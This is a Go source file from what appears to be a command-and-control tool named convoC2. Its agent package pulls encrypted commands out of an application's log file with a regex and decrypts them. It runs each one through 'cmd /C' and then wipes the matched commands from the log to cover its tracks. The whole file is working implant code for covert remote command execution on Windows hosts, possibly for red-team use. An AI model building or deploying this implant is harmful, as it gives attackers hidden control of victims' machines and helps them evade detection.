package agent

import (
	"bytes"
	"fmt"
	"os"
	"os/exec"
	"regexp"

	"github.com/cxnturi0n/convoC2/pkg/crypto"
)

type CommandOutput struct {
	Command string
	Output  string
	Success bool
}

func execCommand(command string) CommandOutput {
	cmd := exec.Command("cmd", "/C", command)

	var stdout bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	err := cmd.Run()

	var result CommandOutput
	result.Command = command

	if err != nil {
		result.Output = stderr.String()
		result.Success = false
	} else {
		result.Output = stdout.String()
		result.Success = true
	}

	return result
}

func readCommand(logFileAsString string, commandRegex *regexp.Regexp, agentID string) (command string) {
	match := commandRegex.FindStringSubmatch(logFileAsString)

	if len(match) > 1 {
		encryptedCommand := match[1]

		// Try to decrypt - handle both encrypted and plaintext commands
		decrypted, err := crypto.Decrypt(encryptedCommand, agentID)
		if err == nil {
			command = decrypted
		} else {
			// Fallback to treating as plaintext (for backward compatibility)
			command = encryptedCommand
		}
	}

	return command
}

func cleanUpOldCommands(commandRegex *regexp.Regexp, logPath string, logFileAsString string) error {

	fileInfo, err := os.Stat(logPath)
	if err != nil {
		return fmt.Errorf("failed to retrieve file info for %s: %w", logPath, err)
	}

	originalMode := fileInfo.Mode()

	// Replace all matched tags with an empty string
	modifiedContent := commandRegex.ReplaceAllString(logFileAsString, "")

	// Try writing the modified content back to the file, so that at the next iteration, the agent won't execute old commands
	err = os.WriteFile(logPath, []byte(modifiedContent), originalMode)
	if err != nil {
		return fmt.Errorf("failed to write to file %s: %w", logPath, err)
	}

	return nil
}
